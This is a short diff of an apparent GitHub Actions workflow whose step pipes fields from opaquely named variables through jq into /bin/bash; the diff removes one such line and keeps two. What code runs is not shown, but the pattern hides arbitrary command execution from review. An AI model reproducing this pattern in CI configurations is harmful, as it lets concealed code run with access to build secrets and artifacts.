@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
           echo $xlvgi700 | jq -r .kxuo27234 | /bin/bash
-          echo $zye6 | jq -r .cafe7136 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
